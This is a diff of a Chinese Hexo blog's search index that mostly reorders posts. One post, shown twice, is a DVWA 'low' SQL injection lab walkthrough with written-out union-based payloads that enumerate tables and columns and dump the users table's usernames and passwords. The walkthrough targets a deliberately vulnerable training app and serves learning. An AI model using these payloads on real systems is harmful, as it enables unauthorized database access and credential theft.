@@ -2118,6 +2118,55 @@ PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source 
       </tags>
   </entry>
   <entry>
+    <title>dvwa--SQL注入(low)</title>
+    <url>/posts/cb7e67e1/</url>
+    <content><![CDATA[<h1 id="dvwa–SQL注入（low）"><a href="#dvwa–SQL注入（low）" class="headerlink" title="dvwa–SQL注入（low）"></a>dvwa–SQL注入（low）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>low级代码分析</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span></code></pre>
+
+<p>未对输入进行过滤，我们输入的内容会传给<code>$id</code>，因此可以考虑在输入上做文章</p>
+<p><strong>我们可以通过以下步骤判断这里是否存在注入点</strong></p>
+<p>① 输入1 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png" alt="1" loading="lazy"></p>
+<p>②输入1’ 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png" alt="2" loading="lazy"></p>
+<p>③输入1 and 1&#x3D;1 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png" alt="3" loading="lazy"></p>
+<p>④输入1 and 1&#x3D;2提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png" alt="4" loading="lazy"></p>
+<p>**猜解 SQL 查询语句中的字段数, **</p>
+<p>①1’ order by 1#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png" alt="5" loading="lazy"></p>
+<p>②1’ order by 2#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png" alt="6" loading="lazy"></p>
+<p>③1’ order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png" alt="7" loading="lazy"></p>
+<p>④确定显示的位置 (SQL 语句查询之后的回显位置)</p>
+<p>1’ union select 1,2# #从下图可以看出有 2 个回显</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png" alt="8" loading="lazy"></p>
+<p><strong>查询当前的数据库, 以及版本</strong></p>
+<p>1’ union select version(),database()#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png" alt="9" loading="lazy"></p>
+<p>获取数据库中的表,</p>
+<p>1’ union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png" alt="10" loading="lazy"></p>
+<p>获取表中的字段名,</p>
+<p>1’union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png" alt="11" loading="lazy"></p>
+<p>获得字段中的数据,</p>
+<p>1’ union select user, password from users#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png" alt="12" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>DVWA</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dvwa--CSRF</title>
     <url>/posts/4161e8ef/</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF是一种攻击，它迫使最终用户在当前已通过身份验证的web应用程序上执行不想要的操作。借助一点社会工程的帮助(例如通过电子邮件&#x2F;聊天发送链接)，攻击者可能会迫使web应用程序的用户执行攻击者所选择的操作。</p>
@@ -2165,55 +2214,6 @@ PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source 
 <p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164046.png" alt="7" loading="lazy"></p>
 <h2 id="High级-amp-Impossible级"><a href="#High级-amp-Impossible级" class="headerlink" title="High级&amp;Impossible级"></a>High级&amp;Impossible级</h2><p>略</p>
 <p>注：教程来自[<em><a href="https://www.iculture.cc/cybersecurity/pig=243">【DVWA全攻略】DVWA CSRF 实验-FancyPig’s blog </a></em></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>DVWA</category>
-      </categories>
-      <tags>
-        <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dvwa--SQL注入(low)</title>
-    <url>/posts/cb7e67e1/</url>
-    <content><![CDATA[<h1 id="dvwa–SQL注入（low）"><a href="#dvwa–SQL注入（low）" class="headerlink" title="dvwa–SQL注入（low）"></a>dvwa–SQL注入（low）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>low级代码分析</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span></code></pre>
-
-<p>未对输入进行过滤，我们输入的内容会传给<code>$id</code>，因此可以考虑在输入上做文章</p>
-<p><strong>我们可以通过以下步骤判断这里是否存在注入点</strong></p>
-<p>① 输入1 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png" alt="1" loading="lazy"></p>
-<p>②输入1’ 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png" alt="2" loading="lazy"></p>
-<p>③输入1 and 1&#x3D;1 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png" alt="3" loading="lazy"></p>
-<p>④输入1 and 1&#x3D;2提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png" alt="4" loading="lazy"></p>
-<p>**猜解 SQL 查询语句中的字段数, **</p>
-<p>①1’ order by 1#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png" alt="5" loading="lazy"></p>
-<p>②1’ order by 2#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png" alt="6" loading="lazy"></p>
-<p>③1’ order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png" alt="7" loading="lazy"></p>
-<p>④确定显示的位置 (SQL 语句查询之后的回显位置)</p>
-<p>1’ union select 1,2# #从下图可以看出有 2 个回显</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png" alt="8" loading="lazy"></p>
-<p><strong>查询当前的数据库, 以及版本</strong></p>
-<p>1’ union select version(),database()#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png" alt="9" loading="lazy"></p>
-<p>获取数据库中的表,</p>
-<p>1’ union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png" alt="10" loading="lazy"></p>
-<p>获取表中的字段名,</p>
-<p>1’union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png" alt="11" loading="lazy"></p>
-<p>获得字段中的数据,</p>
-<p>1’ union select user, password from users#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png" alt="12" loading="lazy"></p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -2455,6 +2455,24 @@ sqlmap -u &quot;192.168.224.135&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/posts/4a17b156/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo server</code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo generate</code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo deploy</code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>hexo博客上使用waline评论系统</title>
     <url>/posts/5b3b1c7f/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Waline 是一款从 <a href="https://valine.js.org/">Valine</a> 衍生的带后端评论系统。部署简单使用方面，干净整洁，可匿名评论。</p>
@@ -2528,22 +2546,30 @@ SITE_URL: 网站地址，用于在消息中显示。</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/posts/4a17b156/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo server</code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo generate</code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo deploy</code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+    <title>kali-Linux安装搜狗输入法</title>
+    <url>/posts/89dea71d/</url>
+    <content><![CDATA[<ol>
+<li><pre><code>更改镜像源为国内的镜像源（如果已切换则忽略此步骤）
+</code></pre>
+</li>
+<li><p>打开搜狗输入法官网下载Linux版安装包</p>
+</li>
+</ol>
+<p>​	官网<a href="https://pinyin.sogou.com/">搜狗输入法 </a></p>
+<ol start="3">
+<li>打开终端，进入root模式，输入<code> dpkg -i  *.deb</code>完成安装</li>
+</ol>
+<p>注：</p>
+<p>如果安装过程中提示缺少相关依赖，则执行如下命令解决：</p>
+<p><code>sudo apt -f install</code></p>
 ]]></content>
+      <categories>
+        <category>教程</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
   </entry>
   <entry>
     <title>kali-Linux更改镜像源</title>
@@ -2610,36 +2636,10 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>kali-Linux安装搜狗输入法</title>
-    <url>/posts/89dea71d/</url>
-    <content><![CDATA[<ol>
-<li><pre><code>更改镜像源为国内的镜像源（如果已切换则忽略此步骤）
-</code></pre>
-</li>
-<li><p>打开搜狗输入法官网下载Linux版安装包</p>
-</li>
-</ol>
-<p>​	官网<a href="https://pinyin.sogou.com/">搜狗输入法 </a></p>
-<ol start="3">
-<li>打开终端，进入root模式，输入<code> dpkg -i  *.deb</code>完成安装</li>
-</ol>
-<p>注：</p>
-<p>如果安装过程中提示缺少相关依赖，则执行如下命令解决：</p>
-<p><code>sudo apt -f install</code></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>《天堂旅行团》摘抄</title>
     <url>/posts/7d0fc3d8/</url>
     <content><![CDATA[
-    <div id="aplayer-XUJIBSbU" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-RFIBPAuT" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
     ></div>
 
